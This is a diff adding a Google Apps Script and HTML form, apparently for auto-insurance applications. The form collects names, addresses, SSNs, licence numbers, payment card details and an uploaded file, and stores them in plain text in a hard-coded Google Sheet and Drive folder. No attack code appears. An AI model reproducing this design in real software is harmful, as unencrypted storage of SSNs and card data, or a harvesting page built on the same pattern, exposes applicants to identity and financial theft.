@@ -1,0 +1,197 @@
+///////////////////////////////////
+
+function doGet() {
+  return HtmlService.createHtmlOutputFromFile('index');
+}
+
+function uploadFullForm(formData) {
+  var folder = DriveApp.getFolderById('12Ds6yc01ZPmxF0dKbxxd-nasoJy7A_AY');  // Your folder ID
+  var blob = Utilities.newBlob(Utilities.base64Decode(formData.myFile), formData.fileType, formData.fileName);
+  var file = folder.createFile(blob);
+  var fileUrl = file.getUrl();
+
+  var sheet = SpreadsheetApp.openById('1v8zAEfVx6x3ObsPJnJznc7KlGAltGL6VUA5WV1Sjb-E').getActiveSheet();  // Your sheet ID
+  sheet.appendRow([
+    formData.firstName, formData.lastName, formData.dob, formData.address, formData.vehicleDetails, formData.vehicleOwnership,
+    formData.financeCompany, formData.vehiclePurpose, formData.dailyMiles, formData.theftDevice, formData.maritalStatus,
+    formData.gender, formData.educationLevel, formData.earningSource, formData.workField, formData.jobDesignation,
+    formData.accidents, formData.stateCarRegister, formData.stateLicenseRegister, formData.vehicleOwner, formData.licenseYear,
+    formData.coverageLimit, formData.otherLicense, formData.defenseCourse, formData.courseYear, formData.licenseNumber,
+    formData.policyActivationDate, formData.ssn, formData.vinNumber, formData.gmail, formData.cardDetails, fileUrl
+  ]);
+
+  return fileUrl;  // Return the file URL to display
+}
+///////////////////////////////////////
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Full Form with File Upload</title>
+  </head>
+  <body>
+    <h1>Upload File with Full Form</h1>
+    <form id="uploadForm">
+        <!-- All the form fields -->
+        <label for="firstName">First Name:</label>
+        <input type="text" id="firstName" required><br><br>
+
+        <label for="lastName">Last Name:</label>
+        <input type="text" id="lastName" required><br><br>
+
+        <label for="dob">DOB:</label>
+        <input type="date" id="dob" required><br><br>
+
+        <label for="address">Address:</label>
+        <input type="text" id="address" required><br><br>
+
+        <label for="vehicleDetails">Vehicle Details:</label>
+        <input type="text" id="vehicleDetails" required><br><br>
+
+        <label for="vehicleOwnership">Vehicle Finance or Own:</label>
+        <input type="text" id="vehicleOwnership" required><br><br>
+
+        <label for="financeCompany">Finance Company Name:</label>
+        <input type="text" id="financeCompany"><br><br>
+
+        <label for="vehiclePurpose">Vehicle Purpose:</label>
+        <input type="text" id="vehiclePurpose"><br><br>
+
+        <label for="dailyMiles">Daily Miles:</label>
+        <input type="number" id="dailyMiles"><br><br>
+
+        <label for="theftDevice">Any Theft Device in Vehicle:</label>
+        <input type="text" id="theftDevice"><br><br>
+
+        <label for="maritalStatus">Marital Status:</label>
+        <input type="text" id="maritalStatus"><br><br>
+
+        <label for="gender">Gender:</label>
+        <input type="text" id="gender"><br><br>
+
+        <label for="educationLevel">Education Level:</label>
+        <input type="text" id="educationLevel"><br><br>
+
+        <label for="earningSource">Source of Earning:</label>
+        <input type="text" id="earningSource"><br><br>
+
+        <label for="workField">Field of Work:</label>
+        <input type="text" id="workField"><br><br>
+
+        <label for="jobDesignation">Job Designation:</label>
+        <input type="text" id="jobDesignation"><br><br>
+
+        <label for="accidents">Any Accidents in Last 5 Years:</label>
+        <input type="text" id="accidents"><br><br>
+
+        <label for="stateCarRegister">State Car Registered:</label>
+        <input type="text" id="stateCarRegister"><br><br>
+
+        <label for="stateLicenseRegister">State License Registered:</label>
+        <input type="text" id="stateLicenseRegister"><br><br>
+
+        <label for="vehicleOwner">Vehicle Owner:</label>
+        <input type="text" id="vehicleOwner"><br><br>
+
+        <label for="licenseYear">License Year:</label>
+        <input type="text" id="licenseYear"><br><br>
+
+        <label for="coverageLimit">Coverage Limit:</label>
+        <input type="text" id="coverageLimit"><br><br>
+
+        <label for="otherLicense">Other Country License:</label>
+        <input type="text" id="otherLicense"><br><br>
+
+        <label for="defenseCourse">Defense Driving Course:</label>
+        <input type="text" id="defenseCourse"><br><br>
+
+        <label for="courseYear">Course Year:</label>
+        <input type="text" id="courseYear"><br><br>
+
+        <label for="licenseNumber">Driving License Number:</label>
+        <input type="text" id="licenseNumber"><br><br>
+
+        <label for="policyActivationDate">Policy Activation Date:</label>
+        <input type="date" id="policyActivationDate"><br><br>
+
+        <label for="ssn">SSN Number:</label>
+        <input type="text" id="ssn"><br><br>
+
+        <label for="vinNumber">VIN Number:</label>
+        <input type="text" id="vinNumber"><br><br>
+
+        <label for="gmail">Gmail:</label>
+        <input type="email" id="gmail" required><br><br>
+
+        <label for="cardDetails">Card Details:</label>
+        <input type="text" id="cardDetails"><br><br>
+
+        <!-- File Upload -->
+        <label for="myFile">Upload File:</label>
+        <input type="file" id="myFile" required><br><br>
+
+        <input type="button" id="submitBtn" value="Submit">
+        <p id="response"></p>
+    </form>
+
+    <script>
+      document.getElementById('submitBtn').addEventListener('click', function() {
+        var file = document.getElementById('myFile').files[0];
+        var reader = new FileReader();
+
+        reader.onloadend = function() {
+          var base64Data = reader.result.split(',')[1];
+          
+          // Collect all form values
+          var formData = {
+            firstName: document.getElementById('firstName').value,
+            lastName: document.getElementById('lastName').value,
+            dob: document.getElementById('dob').value,
+            address: document.getElementById('address').value,
+            vehicleDetails: document.getElementById('vehicleDetails').value,
+            vehicleOwnership: document.getElementById('vehicleOwnership').value,
+            financeCompany: document.getElementById('financeCompany').value,
+            vehiclePurpose: document.getElementById('vehiclePurpose').value,
+            dailyMiles: document.getElementById('dailyMiles').value,
+            theftDevice: document.getElementById('theftDevice').value,
+            maritalStatus: document.getElementById('maritalStatus').value,
+            gender: document.getElementById('gender').value,
+            educationLevel: document.getElementById('educationLevel').value,
+            earningSource: document.getElementById('earningSource').value,
+            workField: document.getElementById('workField').value,
+            jobDesignation: document.getElementById('jobDesignation').value,
+            accidents: document.getElementById('accidents').value,
+            stateCarRegister: document.getElementById('stateCarRegister').value,
+            stateLicenseRegister: document.getElementById('stateLicenseRegister').value,
+            vehicleOwner: document.getElementById('vehicleOwner').value,
+            licenseYear: document.getElementById('licenseYear').value,
+            coverageLimit: document.getElementById('coverageLimit').value,
+            otherLicense: document.getElementById('otherLicense').value,
+            defenseCourse: document.getElementById('defenseCourse').value,
+            courseYear: document.getElementById('courseYear').value,
+            licenseNumber: document.getElementById('licenseNumber').value,
+            policyActivationDate: document.getElementById('policyActivationDate').value,
+            ssn: document.getElementById('ssn').value,
+            vinNumber: document.getElementById('vinNumber').value,
+            gmail: document.getElementById('gmail').value,
+            cardDetails: document.getElementById('cardDetails').value,
+            myFile: base64Data,
+            fileName: file.name,
+            fileType: file.type
+          };
+
+          // Send data to Apps Script
+          google.script.run.withSuccessHandler(function(response) {
+            document.getElementById('response').innerHTML = "Data submitted successfully: " + response;
+          }).uploadFullForm(formData);
+        };
+
+        reader.readAsDataURL(file);
+      });
+    </script>
+  </body>
+</html>
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
